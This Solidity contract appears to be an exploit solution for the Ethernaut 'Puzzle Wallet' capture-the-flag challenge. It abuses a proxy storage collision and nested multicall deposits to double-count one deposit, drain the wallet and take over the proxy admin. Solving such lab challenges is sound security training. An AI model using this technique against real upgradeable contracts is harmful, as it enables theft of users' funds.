// SPDX-License-Identifier: Unlicense
import "src/PuzzleWallet/PuzzleWallet.sol";
import "exploits/BlockUtils.sol";

contract PuzzleWalletExploit is BlockUtils {

    PuzzleProxy public proxy;
    PuzzleWallet public wallet;

    constructor(address _victim) {
        proxy = PuzzleProxy(payable(_victim));
        wallet = PuzzleWallet(address(proxy));
    }

    function hack() public {
        // 1. Call proposeNewAdmin(address(this)) to set owner to our address
        proxy.proposeNewAdmin(address(this));
        
        // 2. Add ourselves to the whitelist
        wallet.addToWhitelist(address(this));
        
        // 3. Prepare data for multicall to call deposit() and nested multicall to deposit again
        bytes memory depositData = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory innerMulticallData = new bytes[](1);
        innerMulticallData[0] = depositData;
        bytes memory innerMulticall = abi.encodeWithSelector(wallet.multicall.selector, innerMulticallData);
        
        bytes[] memory outerMulticallData = new bytes[](2);
        outerMulticallData[0] = depositData;
        outerMulticallData[1] = innerMulticall;
        
        // 4. Call multicall with value 0.001 ether
        wallet.multicall{value: 0.001 ether}(outerMulticallData);
        
        // Our balance should now be increased by 0.002 ether
        
        // 5. Withdraw ethers by calling execute
        wallet.execute(address(this), 0.002 ether, "");
        
        // 6. Set maxBalance to our address
        wallet.setMaxBalance(uint256(uint160(address(this))));
    }

    receive() external payable {
    }
}
